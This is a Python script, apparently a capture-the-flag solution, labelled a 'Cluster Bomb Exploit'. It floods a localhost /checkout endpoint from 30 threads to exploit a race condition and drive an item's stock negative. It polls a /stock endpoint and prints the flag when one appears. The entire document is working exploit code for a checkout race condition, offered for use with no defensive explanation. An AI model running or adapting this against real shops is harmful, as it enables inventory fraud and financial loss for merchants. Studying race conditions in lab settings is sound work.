#!/usr/bin/env python3
# Cluster Bomb Exploit - Retries until negative stock achieved
# Auto-detects success by monitoring stock endpoint

import requests
import threading
import time
import json

URL_CHECKOUT = "http://localhost:5000/checkout"
URL_STOCK = "http://localhost:5000/stock"  # Assume exists or modify
ITEM_ID = 1
TARGET_NEGATIVE = -5
THREADS = 30

session = requests.Session()

def get_current_stock():
    try:
        r = session.get(f"{URL_STOCK}?id={ITEM_ID}")
        return int(r.json().get("stock", 0))
    except:
        return 0

def race_thread():
    payload = {"item_id": ITEM_ID}
    while get_current_stock() > TARGET_NEGATIVE:
        try:
            r = session.post(URL_CHECKOUT, json=payload, timeout=2)
            if r.status_code == 200 and "Flag" in r.text:
                print(f"\n[!] FLAG: {r.json()['message']}")
                break
        except:
            pass

print(f"[*] Starting cluster bomb attack on item {ITEM_ID}")
print(f"[i] Current stock: {get_current_stock()}")

threads = []
for _ in range(THREADS):
    t = threading.Thread(target=race_thread, daemon=True)
    t.start()
    threads.append(t)

# Monitor progress
while get_current_stock() > TARGET_NEGATIVE:
    print(f"\r[*] Current stock: {get_current_stock()}", end="", flush=True)
    time.sleep(0.5)

print(f"\n[+] Target reached! Final stock: {get_current_stock()}")
